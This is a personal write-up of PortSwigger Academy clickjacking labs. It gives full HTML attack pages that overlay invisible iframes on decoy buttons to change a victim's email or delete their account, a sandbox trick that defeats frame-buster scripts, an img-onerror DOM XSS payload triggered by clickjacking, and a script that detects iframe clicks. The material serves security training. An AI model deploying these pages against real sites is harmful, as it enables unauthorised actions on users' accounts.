# Clickjacking

- https://portswigger.net/web-security/clickjacking
- https://portswigger.net/burp/documentation/desktop/tools/clickbandit

Burp clickbandit tools is great for POCs.

## Basic clickjacking with CSRF token protection

Because of no `X-Frame-Options` or `Content-Security-Policy` with `frame-ancestors` headers we can perform Clickjacking attack, by creating a custom page with clickable content and align it with a target, vulnerable website, using styles, to perform an action on click.

```
<head>
	<style>
		#target_website {
			position:relative;
			width:1000px;
			height:1000px;
			opacity: 0.0001;
			z-index:2;
            top: -500;
            left: -50;
        }
		#decoy_website {
            position:absolute;
            width:300px;
            height:400px;
            z-index:1;
        }
        #click {
            padding: 5;
            width: 100;
        }
	</style>
</head>
<body>
    <div id="decoy_website">
        <button type="button" id="click">
            Click
        </button>
    </div>
    <iframe 
        id="target_website" 
        src="https://0ad900410406b484811f3485002b0049.web-security-academy.net/my-account"
    ></iframe>
</body>
```

This page using `iframe` along with `position`, `left` and `right` styles positions the target page content on our website, allowing us to place the target action button whenever on the page we want. Then using `z-index` and `opacity` we can make this invisible and aligned on top of our decoy page.

The decoy page contains only clickable button, that is perfectly aligned with the invisible target page action button and hidden underneeth it. On clicking it, the target action button would be truly clicked and perform for user unintended action.

To keep in mind, some browsers block certain, too low `opacity` levels.

## Clickjacking with form input data prefilled from a URL parameter

`/my-account` endpoint has a form for updating email.

Form input field is being popullated with quesry params, so entring `/my-account?email=pwned@email.com` will cause the form to be filled and ready to submit.

```
<head>
<style>
    #target_website {
        position:relative;
        width:1000px;
        height:1000px;
        opacity: 0.0005;
        z-index:2;
        top: 0;
        left: 0;
    }
    #decoy_website {
        position:absolute;
        width:100%;
        height:100%;
        z-index:1;
    }
    #click {
        position: relative;
        top: 453;
        left: 50;
        padding: 5;
        width: 100;
    }
</style>
</head>
<body>
<div id="decoy_website">
    <button type="button" id="click">
        Click me
    </button>
</div>
<iframe 
    id="target_website" 
    src="https://0ae800ff04ca24988c468aea00a3000c.web-security-academy.net/my-account?email=pwned@email.com"
></iframe>
</body>
```

## Clickjacking with a frame buster script

Same thing as above regarding email changing functionality, but the page contains a frame busting script

```
<script>
    if(top != self) {
        window.addEventListener("DOMContentLoaded", function() {
            document.body.innerHTML = 'This page cannot be framed';
        }, false);
    }
</script>
```

Simply adding `sandbox="allow-forms"` to `iframe` definition will cause the iframe to be sandboxed and allow only form submission in it, preventing script execution, therefore stoping frame buster.

Once done we can see ERROR log in the console:

```
Blocked script execution in 'https://0ae600f703b3e20d85c7b47b00d70047.web-security-academy.net/my-account?email=pwned1@email.com' because the document's frame is sandboxed and the 'allow-scripts' permission is not set.
```

Solution:

```
<head>
<style>
    #target_website {
        position:relative;
        width:1000px;
        height:1000px;
        opacity: 0.00005;
        z-index:2;
        top: 0;
        left: 0;
    }
    #decoy_website {
        position:absolute;
        width:100%;
        height:100%;
        z-index:1;
    }
    #click {
        position: relative;
        top: 453;
        left: 50;
        padding: 5;
        width: 100;
    }
</style>
</head>
<body>
<div id="decoy_website">
    <button type="button" id="click">
        Click me
    </button>
</div>
<iframe 
    id="target_website" 
    src="https://0ae600f703b3e20d85c7b47b00d70047.web-security-academy.net/my-account?email=pwned1@email.com"
    sandbox="allow-forms"
></iframe>
</body>
```

## Exploiting clickjacking vulnerability to trigger DOM-based XSS

Here we are presented with Submit feedback functionality.

We can notice that for form submition responsible is a script, that grabs all the input form fields, performs XHR request and the displays a success message using dangerous `innerHTML` function without input sanitization.

Additionally the form fields are getting populated from query params, so accessing `/feedback?name=alala&email=email@email.com` fills up `Name` and `Email` field already. Here the reflected input for input fields value is encoded and do not allow performing classic XSS with tag value escaping.

Since this is DOM XSS, and script tags will not be executed on adding them with `innerHtml` we can make use of `img`, which will be processed as usual.

Providing a name like `name=name<img src=X onerror=print()>` will cause `print()` function call when proccessed after `innerHtml` caused by form submission.

The endpoint prepared for form submission and code execution in one click:

```
/feedback?name=name<img src=X onerror=print()>&email=email@email.com&subject=subject&message=message
```

Webiste for the victim:

```
<head>
<style>
    #target_website {
        position:relative;
        width:1000px;
        height:1000px;
        opacity: 0.00005;
        z-index:2;
        top: -500;
        left: 0;
    }
    #decoy_website {
        position:absolute;
        width:100%;
        height:100%;
        z-index:1;
    }
    #click {
        position: relative;
        top: 300;
        left: 50;
        padding: 5;
        width: 100;
    }
</style>
</head>
<body>
<div id="decoy_website">
    <button type="button" id="click">
        Click me
    </button>
</div>
<iframe 
    id="target_website" 
    src="https://0a64006f04e839eb81b83916008e00d4.web-security-academy.net/feedback?name=name%3Cimg%20src=X%20onerror=print()%3E&email=email@email.com&subject=subject&message=message"
></iframe>
</body>
```

Here we needed to get rid of `sandbox` tag, because of the error:

```
Access to XMLHttpRequest at 'https://0a64006f04e839eb81b83916008e00d4.web-security-academy.net/feedback/submit' from origin 'null' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.
```

## Multistep clickjacking

Here deleting the account is separated into two steps with confirmation, but we can see that both of that pages does not contain neccessary headers to protect them from Clickjacking.

Here we would require two clicks, so we can prepare two buttons in different positions:

```
<head>
<style>
    #target_website {
        position:relative;
        width:1000px;
        height:1000px;
        opacity: 0.0005;
        z-index:2;
        top: 0;
        left: 0;
    }
    #decoy_website {
        position:absolute;
        width:100%;
        height:100%;
        z-index:1;
    }
    #click1 {
        position: absolute;
        top: 500;
        left: 30;
        padding: 5;
        width: 120;
    }
    #click2 {
        position: absolute;
        top: 300;
        left: 195;
        padding: 5;
        width: 100;
        font-size: 10;
    }
</style>
</head>
<body>
<div id="decoy_website">
    <button type="button" id="click1">
        Click me first
    </button>
    <button type="button" id="click2">
        Click me second
    </button>
</div>
<iframe 
    id="target_website" 
    src="https://0aef0092039d58a181d0d46200fe0092.web-security-academy.net/my-account"
    sandbox="allow-forms allow-scripts"
></iframe>
</body>
```
`eventListeners` for `blur` and `focus` events can be added to `iframe` to detect clicking it. On every click `iframe` current decoy button can be hidden and a new one could be displayed, additiopnally adjusting styles of an iframe to align with that new one. Moreover on every click we can unfocus again the iframe to detect further clicks. 

Unfortunately I could not find how to detect if the iframe was clicked at the position of the decoy button. IIUC (If I understand correclty) only the event of clicking the frame is possible to detect due to security of `iframes`. We must hope that the user will click exactly on the buttons to try to adjust the iframe size every time cleverly.

POC for detecting iframe click:

```
focus();
const listener = window.addEventListener('blur', () => {
  if (document.activeElement === document.querySelector('iframe')) {
    console.log('clicked on iframe')
  }
  window.removeEventListener('blur', listener);
});
```
